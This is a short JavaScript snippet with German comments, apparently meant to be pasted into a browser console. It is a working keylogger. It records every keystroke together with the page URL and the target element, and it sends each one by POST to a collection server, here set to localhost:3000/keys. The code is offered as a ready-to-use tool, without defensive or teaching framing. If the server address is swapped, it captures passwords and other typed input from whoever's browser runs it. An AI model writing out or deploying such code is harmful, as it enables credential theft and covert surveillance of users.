// BROWSER-KONSOLE: Diesen Code in die Browser-Konsole einfügen
const SERVER_URL = 'http://localhost:3000/keys';

document.addEventListener('keydown', (event) => {
    const data = {
        key: event.key,
        code: event.code,
        timestamp: Date.now(),
        url: window.location.href,
        target: event.target.tagName
    };
    
    fetch(SERVER_URL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(data)
    }).catch(err => console.log('Send error:', err));
    
    console.log('Key sent:', data.key);
});

console.log('Keyboard logger aktiv. SERVER_URL:', SERVER_URL);